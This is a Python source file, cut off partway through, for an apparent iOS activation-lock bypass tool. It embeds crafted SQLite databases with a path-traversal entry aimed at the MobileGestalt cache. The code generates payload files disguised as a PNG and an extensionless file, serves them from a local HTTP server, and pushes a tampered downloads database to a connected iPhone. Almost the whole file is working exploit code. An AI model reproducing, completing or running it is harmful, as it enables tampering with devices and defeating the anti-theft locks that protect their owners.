import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import socket
import threading
import zipfile
import tempfile
import binascii
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

# --- CONFIGURATION & CONSTANTS ---

# SQL Template 1: BLDatabaseManager Structure
BL_STRUCTURE_SQL = """
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE ZBLDOWNLOADPOLICYINFO ( Z_PK INTEGER PRIMARY KEY, Z_ENT INTEGER, Z_OPT INTEGER, ZSTOREPLAYLISTIDENTIFIER INTEGER, ZPOLICYID VARCHAR, ZPOLICYDATA BLOB );
CREATE TABLE Z_PRIMARYKEY (Z_ENT INTEGER PRIMARY KEY, Z_NAME VARCHAR, Z_SUPER INTEGER, Z_MAX INTEGER);
INSERT INTO Z_PRIMARYKEY VALUES(1,'BLDownloadInfo',0,6);
INSERT INTO Z_PRIMARYKEY VALUES(2,'BLDownloadPolicyInfo',0,2);
CREATE TABLE Z_METADATA (Z_VERSION INTEGER PRIMARY KEY, Z_UUID VARCHAR(255), Z_PLIST BLOB);
INSERT INTO Z_METADATA VALUES(1,'2D3944E4-521A-43A6-AFF5-55A3E2A63841',X'62706c6973743030d80102030405060708090b0c0d0e0f14155f101e4e5353746f72654d6f64656c56657273696f6e4964656e746966696572735b4e5353746f7265547970655f10125f4e534175746f56616375756d4c6576656c5f101f4e5353746f72654d6f64656c56657273696f6e4861736865734469676573745f101e4e5353746f72654d6f64656c56657273696f6e436865636b73756d4b65795f10194e5353746f72654d6f64656c56657273696f6e4861736865735f101d4e5350657273697374656e63654672616d65776f726b56657273696f6e5f10204e5353746f72654d6f64656c56657273696f6e48617368657356657273696f6ea10a505653514c69746551325f10586d4a52623772585a664f6e6a7541714d504739695537424d4164766672543033797a7678344878636273307a34636e4b6f357a677262715149635542764c65527a524f506c79744249307a4a5772546b4e4639314f773d3d5f102c7671527a56456f3535615a6d6d433733355a63682b734c42336a4a6c6366314b4a4c476b456c79527a79513dd2101112135f1014424c446f776e6c6f6164506f6c696379496e666f5e424c446f776e6c6f6164496e666f4f102045bb929b5dd5da6fbca53674a37213713b95aef9df0c51c7085cc1e283f02f714f1020b42f3d26a27e7248429c9d5466fc52910c9b42055169caafcc2ec5e396c86f631105a7100300080019003a0046005b007d009e00ba00da00fd00ff01000107010901640193019801af01be01e1020402070000000000000201000000000000001600000000000000000000000000000209');
CREATE TABLE Z_MODELCACHE (Z_CONTENT BLOB);
INSERT INTO Z_MODELCACHE VALUES(X'8d99097c14c5d2c06bba7726c99eb3d7ec1d1003724b8080800281000621047207c2b2d90cc9c26637ec6e808042738380280a722a248a170808080f790a2a8a7821873c449ec7f329f814541041f3e1d7331bb201032efcea97d9e99e7f5757575755cf9456f97de148972ec78101041814c0020709a02c4c992c86c2be60a028c513f256f8e8afdc9448b0aa3025583a41f446c20660e66f70f3baac9c07c41ab12cbda1d327900849b9a160304298adfcfba0023598a105b4860ed0113a4137b8077a415fc8877fc2ebf006ec8703f026bc056fc3417807de8543f01e1c86f7e103f8103e828fe1087c0247e1181c8713f0299c847fc129f80c4ec3e77006fe0d5fc097f0157c0dff816fe0bff02d7c0767e11c7c0fff831fe04738cf6046c1b08c92313226269969c1b464da31ed99ee4c1ad383e9cfa433039861cc70268b29628a192f53c6543201660a339599c5cc6616334b9815cc4ae6696603f302f322b383d9c9fc93799d39c4bcc71c668e31c79933ccbf99ef98b3cccfcc2fcc1f4c3d6211877488473686417674274a419d5067740fea8506a08168181a8ef251011a873c68029a8822a81acd4033d142b4082d478fa375683dda849e43dbd076b417bd86de4607d147e863f42f740a7d8dfe837e403fa2cbe837548f0123cc6115e6b10ddb71326e83dbe3ceb83b4ec3bd705f3c000fc29938178fc56e3c0e7bf0041cc611fc109e8167e10578315e821fcb4b0954fbfdc741035ad0010f7a3080114cc559398302115fc42786ddbc252b67b018f1568c1227558be148ae5859e5f744a41653564e7ed43732cb44da7fbc8ffeca4ff1fa3de1304104c8bbe4f0091028d70256b0811d1ce0041724e74ff6f829ab242c4a2e35dc5355e50b94175370a4263738510c1434b81c5192770826493c739c425ac21d14d20aee84148af08b81f24845ee44b1264c1279441447a10ded7417b4a7da776ef0cd5a680bed084b38923076c0b08ce094803fe829cb0c8c0f52ed6337b2837e9fb746ba7d143ac3ddd005528ba3d308782ac5c2e8a5182ec8ca490f853c35b5b443d7c2ac9c11f220d147ba439a9b77d03d10a04cba11c20db3ca8984a8b1ca6b52eba007f484aeb7efe4e6edb76e75f36ddd6ed948eeb03f1871472453b9bb7bbb7677f7baa7ccebf67853457769cf9edddceea82d7a43fb5ae803f71215798d247c0efda03fa4c300da32103260100c8621703f64c250780092a8a5b2e8ea67c3487a65a0fff3c664e5648782556248f2036ad4bcb0186a305d56ce704fc0532e96454d303c5826fae5db03254b6551a30d0e866417a25a9b1bdde47e4fb882f6951dc5cd5b1b1c2b3350264ecd10c3de90af2a427b51cfd25352b0b22a581d28935bc5f0980697ac91e025593939d5a562838bcabfa89a62c378548d51225d386aba985f1235798130d415f652bfdc42fe41af80fe7fe91814c8b62a8487611f5de0ce92436de553a1088a61348c8112180b6e18071e28052f948108e3a11c2ac007136022f8a1120210842a980421084304aa61324c81a95003d3603a3c080fc10c9849879a05b3610ecc8579301f16c042584434444b7484277a62204662226622100bb1121bb1130771121749262d484b72076945ee2429a4356943ee226d493bd29e74201d4927d299dc4dba9054d2957423dd491ae9417a927b482fd29bf421f792fba4692c8625b0141e8165f0283c06cbe171780256c04a781256c16a58036b611dac87a7e069d8001ba116eae019781636c173f03cbc002fc24bb019b6c0cbb015b6c176780576c04ed805afc26ed803ff80bdf01ae94b06900c32846492616404194572493e2924c5640c194bc691525246c6930a32915492209944c2a49a4c2135e441328310329bcc25f3c942f23059421e218f92e5e409b292ac226bc83af214d9406ac933641379be484e4ed99e48458918f0866a6437a13bc4cd1b7ce16141afc73fd0e3ad1073c4100d1c79e5622024ba7963a0bab2540c8d183fa08646abdca0e47c05218f77485e66465138e20945727d95621ebd8a8885e1ea52ea3c7e717430e42bf7053cfebc51c3684e0b47822131e64425e37d7e71d0d4881890bc39a73a449d5eeff17aa99f4662bd0a2be848b93555622175ca4abf2f3091fa6495b403c2f4c9261d8b7ce151a23c4461d817189fe18978e898be70b1af8aee79d153e929f58b632bcbd224d5e91dead0e1d154ef29c1d044c91874f048059d64c0e3f36756d2ed282bcd7bfdbe1b86a1ddbc9e8057f45f0f77b45b6ed8e38f501bf9c2e9d59160a527e2f35e6f1d5dd670410d3cd6eb173d81eaaa6c31502685e8eb4d9919342f8ca75bcc5f937ef3f4c78a55d5a5a37ce5159170544903fd4de3ab475ab48640905f56158d241679fad97e4f8db4c23148319d26bd216d761a4068000c843ddec80d99866a4f834d24475abf81159e40b928ada79bb7856537c8faebeae74ef405ca72c3be6962b12f9c5d4d538f272c1649a13d12d5d4e40dfafda23c4e7ae3f825a5d535d99e10bd8a50e5e902c53ae54a2e33a6aa8144d74fcc93bda8d017cef1d034299ea691e502fc043fc32f70112ec1af70197ea311f70a5c85dfe10fa8a7e1d9007f828161e0cf51ee6caa3dcd3111bad4a5d511315fca928d11552eb11adb24ffa23131333c42de0c1e7fe1f50039362b27431cefa9f647e4e7c73646f19a2845a0e1586ac8958c3a3e18aaa4b6a20d34c00ff67bcac374d5493a7f91f4d7a37d49347300e947e82c48bfd826a44345bd514e7d0cc724c8d446dd9ac4f23a26914992b2de2ddae5ec705dbf26f7e3321cc34b866378924efa47551d28c98d31e2362446602c0d24874c7250d2603d6e19850d92a4d910430d1075aff8d46c23c3dbc4d4bc5f92689cbabd7a9d2402d385499509a9b27a4c4709f200194a21439b0f733cdc0e7b0fd3ab41b1fb64ec7d149ba5570c8bea365c92eb71329f667dfae776b40c6650032d53a66552da483d9e1ba5654b128bb69427ed92cfe9d31729ed125c664650f64f94fb2be55da0dba00fd389e94237453d5c6104a8670a9802b83a5af2f4682550264f1e92245b24911c92138de0f1adc43859c571b195c893a431fac70799204326c420059234cd1cf12d6a44e644a2139126554439457fcd3af1693543a6cd8869355a921b33567ca4853269618c54228994ede29bd772f9f9e5b179b9e9f3eee632657cfaac9379eb62fa782469ccb2f14136c9904d31885792c60c1ddfccb6c9906db199891422de22bbc71778f6cac8bdd79140ca25895506b7a3ec670e34500eca94839432418fcf46413e491a0b8be8cef3c4a7d411197724a6945f92bfd626f199fe3399f659ccf401496eaa6be2437d23a3be89a1aa24695a13c5c7392f73cec73821499aaba7e2e35d91795762bc8824cdd46271e110927008c570932569ae8e8b8fa79679ea186faa24720d188743203312648070dd21a693691430adf9fa313e955acac49631951e92a469ed199f66ed654efb9866332967e64d75eb6df30d55c910cd3754bd7ad403f580abb246728ea1dacd22b39a14be71450ad44f56ab5f2c52cca1c039b72e9ae3339a9c615166cc68f324b9a9e08e4fc11c199513537001452d68b6588f2b04a11219582285a0a86e8b246928f4e3d08922ca6544792cec2c96e4d68784f88c3649a64e8a196da9244d0e18f161a6cb98e931cc32496e7538b9dd841b2b26344f66ce932aa628f331499a3fd8c467c265327159cc848f4b72bb43517cb35f2d7357c766bf4212f940158762d4dfea64405dccdf9ea48027e5c3581c1b9d6ab045066c89cd6cb5244d0e72f14d64b78cd91d9bc85a496287c0f8280764ca811865bd24b73840c6877c5f46be1f433e2dc98d87cff8482764d2891869a3247f3db8c6e7a35fc8b42f623e5a27c90d87def8d43a2783cec5d47a5692bcbf2bbc9bb8c045997031e602cf49d278d8964fa3e80aba4a375056cef0ea8854a264f8e4097b423575e877f48774146dae911ea5633f1ade09a2ff43d7d09f1b369017a3e43f30532b118e028f315660b6282ba773582e5fc8e69b5e2fcb4fe0049c289fda1b868b963a7538092b253d6e6e6872aca6a36335d6d5620dd69297c94eb2e704d663033652ebf0d804062c401f6c958e45d2a1287ab0b7d093b414d53c7ef96676482c930279f4c5817c6b905faca4112a4cb652c36da326dc416b8ad29a46c533e45ed1e11dd07e237692ed24e1045d9c5f710bdc12df815ba11e4c1ad6407decbb4053b2548fdfd4d2e4504fd54d0f7ba32999bc42f3eacb49513bdd85dbbaf9e466784d1eaec5ed24a3fd4daf28af03ee786b2d6a71270974abe6a686be9b1a3a553234d9450df6aa64b031a53572606e62a91e92a57a92dd37598a9e5cd3b016eae94c73c8ce8699f6c3fdc7362ebbfc31a10ea74b9f136eba1b250fc4ba0d644ff4c9c17888ecbad1973c37cce7fe06affe4bd36730986a3400fac3101808fde8864a87fba19dfca2ff01a9eac1d9782424818170f27bf11788f44e7c1f394818020dbb00e7e122d85787f371012e24ff24af9337ea70311e8dc790fde400798b3c7f9bb77855f28715e9e05118bd8ca77ebaf7e652e035d2500afc7d25429fc555d2b3b82a5a8948cfbe2949135dfe3e5e49986932665a345e4998b725699cc7f52840c8e6db7d4bc2b3f11cf9ed57e3579d589c497d16cfc5f3f0fc6858ba451ff90d59330dcdc7b1a8df2cc40f6fc48bc821f25e765489a5f89131b1682346eaf032fc2874bde15e1e0d3f62f46b165e8e1fbfc5579e5afc84a46cb36d90287f9feb08a9d09b7adb48c887d150c25c66ea91065951579489b2d128948bf25121aa4411341b2d452bd09368355a8bd6a3a7d136b41bed43afa3fde84df43efa149d4667d017e82bf4138da43422e114dc11a7e2de745f7870059e8febf047f824fe1cff1b7f89bf5618152d151d140314458a498a258a0d8a2d8ad714ef29be547cadf846f1ade2ace27bc50f8af38a9f14bf282e292e2baeb02cab61436c849dcc4e65a7b10fb23358c2ce66e7b2f3d985ecc3ec12f611f6517639fb04bb925dc5ae61d7b14fb11bd85af6197613fb3cfb22bb997d99ddc6bec2ee645f65f7b07bd97decebec7ef64df66df61df6107b98fd80fd883dc21e658f73bdb83edc7d5c3f2e9d1bc80de2867099dc03dc706e043792cbe1f2b802ae881bcd95706ecec37939912be77cdc44ae920b7293b83057cd4de16ab8e9dc43dc4c6e1637879bc72de016718bb9a5dc32ee31ee716e05f724b79a5bcbade79ee3767187b923dcb7dc79ee0a772d2121c198d03aa15b42cf84071272134a12220933121624ac4e783e6167c2a184d30917122e252a1385c4d6895d12872616250612ab139725ae497c25f150e23789e712cf275e4dc249f6a4b649bd9386240d4fca4f9a93343fa9366967d281a4c349a792ce2a19a55aa955f24a83d2ac149456a55de954262b5b2a5b293b2ad3947d9505cab1ca29ca65ca7dcad795fb9507946f290f2adf55bea77c5f794ac5a912554a9546a555f12a83caa41254565527550f955725aaca5515aa092abf2aa0aa5285545355cfaa9e53bda0daacdaa2daaadaaedaa1daa5daadfa50f5b1aa5e754d0d6aac56a83975a25aa956abb56a41ed520f550f5367a947aa47a973d5f9ea4275b17a8c7abcba52fd94fa45f566f5cbea6deaedea1dea5dea57d57bd47bd5fbd53faa2fa87f56ffa2bea4beacbea2fe5d5daf61355d35dd353d343d35bd347d34f769fa69d235c335d3340f6a6668666a6669e668e66916681669d66a0e690e6b3ed07ca8f958f389e698e684e6a4e6bf5a83d6a415b416ad4debd0bab42db477685b6b476973b5f9da026d9176b4b644ebd67ab4d5da5aed33da4ddae7b42f685fd26ed16ed56ed7eed57ea73da7fd9ff607ed79ed4fda5fb497b497b57fea3aea3aebbae85275dd7469ba9eba5eba3eba51ba99ba59ba39bab9baf9ba85ba87754b748fe856e90eeaded5bda7fb40f7a1ee63dd27ba63ba13ba93ba2f75dff1265ee0adbc8d77f02ebe057f077f279fc697f265fc78be9cf7f113f94a3ec84fe209bf85dfca6fe75fe177f2aff27bf8bdfc3efe10ff2bff1b7f95ff9dafe7afe9418ff40abd553f483f449fa91faa1fa6cfd267eb47e973f5e5fa27f42bf5abf4abf56bf5ebf54feb37eaebf4bbf5dfe8bfd59fd59fd3ff4fffa3fe82fe67fd45fd15436bc35d867686f6868e86ce862e86ae86ee86a18629861ac374c38386190662986d986b986f586e78c370c0f096e16dc33b864386c3860f0c1f19ce18b546de68309a8c66a3c56833da8d4e63b2b19d31df58682c368e369618dd468fd16b148d338d9b8d2f1bb719b71b77187719771bff617ccd78d8f89bf1aaf10f63bdf19a094cc8a430712687e97ed350d330d370d308d348538e29cf54601a6b5a6c5a6a5a667ad4b4dcf48469a56995698d69a7e92bd37f4cff357d6b3a6bfadef483e9bce927d31fe6b6e6f6e68ee64ee6bbcda9e66ee634734ff308f383e61966629e659e639e675e605e645e6cde68fec87cc47cd47ccc7cc27cd27cca7cda7cc67c556823b415da0b1d844ec2dd42aad04d48137a0be5824f9828f8858050258484883059982e3c2fbc286c16b6085b85edc20e6197b05b7853b820fc2c5c142e0997852bc2ef42bd70cd926849b3f4b4f4b2f4b6dc6be96be96f1960c9b08cb62cb43c6c5962596a596679ccf2b86585e549cbb396a396e3964f2d272da72ca72d672c5f58beb25cb4b6b4b6b2a6585b5befb2b6b376b076b2de6dbdd7eab34eb4565a03d62a6bc81ab14eb64eb5ceb0be64dd62dd6add667dc5bad3faaa758f75aff52deb07d6afade7ac7fdad4369bcd6e73d85cb636b60eb6eeb6beb6feb611b642db04db24db1cdb12db0adb1adb3adb53b60db65db603b6d3b61f6d176c3fdb2eda7eb5fd6657d94d768bdd6677d8bbd887dacbec55f6903d629f6c9f6227f68df64df677ed47ecdfdb2f38921cc98e968e568e14471b475b479aa3af23dd31d031c851ec18e318eb18e7f03826386a1cc4b1ccb1cab1dab1d6f18c63afe30dc709c73527389153e1e49c894ea553edd43a79a7c1d9c2d9c6d9d6d9ded9d1d9cd99e6ece9ece5ece3cc738e73fa9c2b9dab9c6b9c6b9deb9d4f3b373aeb9ccf3a8f3a8f3b3f759e749e729e769e717ee1fccaf983cbe672b85cae64574b572b578aab8dabad2bd5d5db75af2bc735c655ed22aed5aeedae775d475cc75c275c275dff727de53aeffa3519252726eb93db267702f91f42d1bf7805dcf02f39e3ff01');
CREATE TABLE IF NOT EXISTS "ZBLDOWNLOADINFO" (
	"Z_PK"	INTEGER,
	"Z_ENT"	INTEGER,
	"Z_OPT"	INTEGER,
	"ZACCOUNTIDENTIFIER"	INTEGER,
	"ZCLEANUPPENDING"	INTEGER,
	"ZFAMILYACCOUNTIDENTIFIER"	INTEGER,
	"ZISAUTOMATICDOWNLOAD"	INTEGER,
	"ZISLOCALCACHESERVER"	INTEGER,
	"ZISPURCHASE"	INTEGER,
	"ZISRESTORE"	INTEGER,
	"ZISSAMPLE"	INTEGER,
	"ZISZIPSTREAMABLE"	INTEGER,
	"ZNUMBEROFBYTESTOHASH"	INTEGER,
	"ZPERSISTENTIDENTIFIER"	INTEGER,
	"ZPUBLICATIONVERSION"	INTEGER,
	"ZSERVERNUMBEROFBYTESTOHASH"	INTEGER,
	"ZSIZE"	INTEGER,
	"ZSTATE"	INTEGER,
	"ZSTOREIDENTIFIER"	INTEGER,
	"ZSTOREPLAYLISTIDENTIFIER"	INTEGER,
	"ZLASTSTATECHANGETIME"	TIMESTAMP,
	"ZPURCHASEDATE"	TIMESTAMP,
	"ZSTARTTIME"	TIMESTAMP,
	"ZARTISTNAME"	VARCHAR,
	"ZARTWORKPATH"	VARCHAR,
	"ZASSETPATH"	VARCHAR,
	"ZBUYPARAMETERS"	VARCHAR,
	"ZCANCELDOWNLOADURL"	VARCHAR,
	"ZCLIENTIDENTIFIER"	VARCHAR,
	"ZCOLLECTIONARTISTNAME"	VARCHAR,
	"ZCOLLECTIONTITLE"	VARCHAR,
	"ZDOWNLOADID"	VARCHAR,
	"ZDOWNLOADKEY"	VARCHAR,
	"ZENCRYPTIONKEY"	VARCHAR,
	"ZEPUBRIGHTSPATH"	VARCHAR,
	"ZFILEEXTENSION"	VARCHAR,
	"ZGENRE"	VARCHAR,
	"ZHASHTYPE"	VARCHAR,
	"ZKIND"	VARCHAR,
	"ZMD5HASHSTRINGS"	VARCHAR,
	"ZORIGINALURL"	VARCHAR,
	"ZPERMLINK"	VARCHAR,
	"ZPLISTPATH"	VARCHAR,
	"ZSALT"	VARCHAR,
	"ZSUBTITLE"	VARCHAR,
	"ZTHUMBNAILIMAGEURL"	VARCHAR,
	"ZTITLE"	VARCHAR,
	"ZTRANSACTIONIDENTIFIER"	VARCHAR,
	"ZURL"	VARCHAR,
	"ZRACGUID"	BLOB,
	"ZDPINFO"	BLOB,
	"ZSINFDATA"	BLOB,
	"ZFILEATTRIBUTES"	BLOB,
	PRIMARY KEY("Z_PK")
);
INSERT INTO ZBLDOWNLOADINFO VALUES(1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,0,0,0,NULL,0,2,765107108,NULL,767991550.1191970109,NULL,767991353.2452750206,NULL,NULL,'/private/var/mobile/Media/Books/asset.epub','productType=PUB&price=0&salableAdamId=765107106&pricingParameters=PLUS&pg=default&mtApp=com.apple.iBooks&mtEventTime=1746298553233&mtOsVersion=18.4.1&mtPageId=SearchIncrementalTopResults&mtPageType=Search&mtPageContext=search&mtTopic=xp_amp_bookstore&mtRequestId=35276ff6-5c8b-4136-894e-b6d8fc7677b3','https://p19-buy.itunes.apple.com/WebObjects/MZFastFinance.woa/wa/songDownloadDone?download-id=J19N_PUB_190099164604738&cancel=1','4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna','../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,'/private/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist',NULL,'Cartas de Amor a la Luna',unistr('https://is1-ssl.mzstatic.com/image/thumb/Publication126/v4/3d/b6/0a/3db60a65-b1a5-51c3-b306-c58870663fd3/Portada.jpg/200x200bb.jpg\u000a'),'Cartas de Amor a la Luna','J19N_PUB_190099164604738','KEYOOOOOO',NULL,NULL,NULL,X'62706c6973743030d80102030405060708090b0c0d0e0f14155f101e4e5353746f72654d6f64656c56657273696f6e4964656e746966696572735b4e5353746f7265547970655f10125f4e534175746f56616375756d4c6576656c5f101f4e5353746f72654d6f64656c56657273696f6e4861736865734469676573745f101e4e5353746f72654d6f64656c56657273696f6e436865636b73756d4b65795f10194e5353746f72654d6f64656c56657273696f6e4861736865735f101d4e5350657273697374656e63654672616d65776f726b56657273696f6e5f10204e5353746f72654d6f64656c56657273696f6e48617368657356657273696f6ea10a505653514c69746551325f10586d4a52623772585a664f6e6a7541714d504739695537424d4164766672543033797a7678344878636273307a34636e4b6f357a677262715149635542764c65527a524f506c79744249307a4a5772546b4e4639314f773d3d5f102c7671527a56456f3535615a6d6d433733355a63682b734c42336a4a6c6366314b4a4c476b456c79527a79513dd2101112135f1014424c446f776e6c6f6164506f6c696379496e666f5e424c446f776e6c6f6164496e666f4f102045bb929b5dd5da6fbca53674a37213713b95aef9df0c51c7085cc1e283f02f714f1020b42f3d26a27e7248429c9d5466fc52910c9b42055169caafcc2ec5e396c86f631105a7100300080019003a0046005b007d009e00ba00da00fd00ff01000107010901640193019801af01be01e1020402070000000000000201000000000000001600000000000000000000000000000209');
CREATE INDEX Z_BLDownloadInfo_byDownloadIDIndex ON ZBLDOWNLOADINFO (ZDOWNLOADID COLLATE BINARY ASC);
CREATE INDEX Z_BLDownloadInfo_byStateIndex ON ZBLDOWNLOADINFO (ZSTATE COLLATE BINARY ASC);
COMMIT;
"""

# SQL Template 2: Downloads Structure (with placeholders)
DOWNLOADS_STRUCTURE_SQL = """
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE asset (
    pid INTEGER, 
    download_id INTEGER, 
    asset_order INTEGER DEFAULT 0, 
    asset_type TEXT, 
    bytes_total INTEGER, 
    url TEXT, 
    local_path TEXT, 
    destination_url TEXT, 
    path_extension TEXT, 
    retry_count INTEGER, 
    http_method TEXT, 
    initial_odr_size INTEGER, 
    is_discretionary INTEGER DEFAULT 0, 
    is_downloaded INTEGER DEFAULT 0, 
    is_drm_free INTEGER DEFAULT 0, 
    is_external INTEGER DEFAULT 0, 
    is_hls INTEGER DEFAULT 0, 
    is_local_cache_server INTEGER DEFAULT 0, 
    is_zip_streamable INTEGER DEFAULT 0, 
    processing_types INTEGER DEFAULT 0, 
    video_dimensions TEXT, 
    timeout_interval REAL, 
    store_flavor TEXT, 
    download_token INTEGER DEFAULT 0, 
    blocked_reason INTEGER DEFAULT 0, 
    avfoundation_blocked INTEGER DEFAULT 0, 
    service_type INTEGER DEFAULT 0, 
    protection_type INTEGER DEFAULT 0,
    store_download_key TEXT, 
    etag TEXT, 
    bytes_to_hash INTEGER, 
    hash_type INTEGER DEFAULT 0, 
    server_guid TEXT, 
    file_protection TEXT, 
    variant_id TEXT, 
    hash_array BLOB, 
    http_headers BLOB, 
    request_parameters BLOB, 
    body_data BLOB, 
    body_data_file_path TEXT,
    sinfs_data BLOB, 
    dpinfo_data BLOB, 
    uncompressed_size INTEGER DEFAULT 0, 
    url_session_task_id INTEGER DEFAULT -1, 
    PRIMARY KEY (pid)
);
INSERT INTO asset VALUES(1,1,0,'media','https://google.com',NULL,'/private/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist','plist',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
INSERT INTO asset VALUES(2,1,0,'media','https://google.com',NULL,'/private/var/containers/Shared/SystemGroup/GOODKEY/Documents/BLDatabaseManager/BLDatabaseManager.sqlite-wal','epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
INSERT INTO asset VALUES(3,1,0,'media','https://google.com',NULL,'/private/var/containers/Shared/SystemGroup/GOODKEY/Documents/BLDatabaseManager/BLDatabaseManager.sqlite-shm','epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
INSERT INTO asset VALUES(4,1,0,'media','https://google.com',NULL,'/private/var/containers/Shared/SystemGroup/GOODKEY/Documents/BLDatabaseManager/BLDatabaseManager.sqlite','epub',0,'GET',0,0,0,0,0,0,0,0,0,NULL,0.0,NULL,0,0,0,0,0,NULL,NULL,0,0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,-1);
COMMIT;
"""

# --- CLASSES ---

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class LocalServer:
    """
    Embedded HTTP server to serve the generated payloads to the device
    over the local network (Wi-Fi).
    """
    def __init__(self, port=8080):
        self.port = port
        self.serve_dir = tempfile.mkdtemp(prefix="ios_activation_")
        self.local_ip = self.get_local_ip()
        self.thread = None
        self.httpd = None

    def get_local_ip(self):
        """Attempts to find the LAN IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to a public DNS server to determine outgoing interface IP
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def start(self):
        """Starts the HTTP server in a background thread."""
        os.chdir(self.serve_dir)
        handler = SimpleHTTPRequestHandler
        self.httpd = TCPServer(("", self.port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"{Style.DIM}  ╰─▶ Local Server running at http://{self.local_ip}:{self.port} (Root: {self.serve_dir}){Style.RESET}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
        if os.path.exists(self.serve_dir):
            shutil.rmtree(self.serve_dir)

    def get_file_url(self, filename):
        return f"http://{self.local_ip}:{self.port}/{filename}"

class PayloadGenerator:
    """
    Generates the specialized SQLite databases required for the bypass.
    Originally logic from the PHP backend, now ported to Python.
    """
    def __init__(self, server_root, asset_root):
        self.server_root = server_root
        self.asset_root = asset_root

    def _create_db_from_sql(self, sql_content, output_path):
        try:
            # Handle 'unistr' format (Oracle to SQLite conversion for python)
            # Regex: find unistr('...') and convert \uXXXX to chars
            def unistr_sub(match):
                content = match.group(1)
                # Convert \uXXXX to actual unicode characters
                # Note: The SQL dump has \\XXXX format, so we look for 4 hex digits
                decoded = re.sub(r'\\([0-9A-Fa-f]{4})', 
                               lambda m: binascii.unhexlify(m.group(1)).decode('utf-16-be'), 
                               content)
                return f"'{decoded}'"

            sql_content = re.sub(r"unistr\s*\(\s*'([^']*)'\s*\)", unistr_sub, sql_content, flags=re.IGNORECASE)
            
            # Just in case unistr remains (simple cleanup)
            sql_content = re.sub(r"unistr\s*\(\s*('[^']*')\s*\)", r"\1", sql_content, flags=re.IGNORECASE)

            if os.path.exists(output_path): os.remove(output_path)
            
            conn = sqlite3.connect(output_path)
            cursor = conn.cursor()
            cursor.executescript(sql_content)
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"{Style.RED}DB Gen Error: {e}{Style.RESET}")
            return False

    def generate(self, prd, guid, sn, local_server):
        # Normalize Product ID
        prd_safe = prd.replace(',', '-')
        
        # 1. Locate MobileGestalt
        plist_path = os.path.join(self.asset_root, "Maker", prd_safe, "com.apple.MobileGestalt.plist")
        if not os.path.exists(plist_path):
            print(f"{Style.RED}[✗] Asset missing: {plist_path}{Style.RESET}")
            return None

        # 2. Create 'fixedfile' (Zipped Plist)
        # Generate random token for obfuscation
        token1 = binascii.hexlify(os.urandom(8)).decode()
        zip_name = f"payload_{token1}.zip"
        zip_path = os.path.join(self.server_root, zip_name)
        
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.write(plist_path, "Caches/com.apple.MobileGestalt.plist")
        
        # Rename to extensionless file as per original exploit
        fixedfile_name = f"fixedfile_{token1}"
        fixedfile_path = os.path.join(self.server_root, fixedfile_name)
        os.rename(zip_path, fixedfile_path)
        fixedfile_url = local_server.get_file_url(fixedfile_name)

        # 3. Create BLDatabase (belliloveu.png)
        # Inject URL 1
        bl_sql = BL_STRUCTURE_SQL.replace('KEYOOOOOO', fixedfile_url)
        
        token2 = binascii.hexlify(os.urandom(8)).decode()
        bl_db_name = f"belliloveu_{token2}.png"
        bl_db_path = os.path.join(self.server_root, bl_db_name)
        
        if not self._create_db_from_sql(bl_sql, bl_db_path): return None
        bl_url = local_server.get_file_url(bl_db_name)

        # 4. Create Final Downloads DB
        # Inject URL 2 and GUID
        dl_sql = DOWNLOADS_STRUCTURE_SQL.replace('https://google.com', bl_url)
        dl_sql = dl_sql.replace('GOODKEY', guid)
        
        token3 = binascii.hexlify(os.urandom(8)).decode()
        final_db_name = f"downloads_{token3}.sqlitedb" # Keep correct extension for local push
        final_db_path = os.path.join(self.server_root, final_db_name) # We don't serve this, we push it via USB
        
        if not self._create_db_from_sql(dl_sql, final_db_path): return None
        
        return final_db_path

class BypassAutomation:
    def __init__(self):
        self.timeouts = {'asset_wait': 300, 'asset_delete_delay': 15, 'reboot_wait': 300, 'syslog_collect': 180}
        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        
        # Server Components
        self.server = LocalServer()
        self.generator = PayloadGenerator(self.server.serve_dir, os.getcwd()) # Assets relative to CWD

        atexit.register(self._cleanup)

    def log(self, msg, level='info'):
        if level == 'info': print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error': print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn': print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
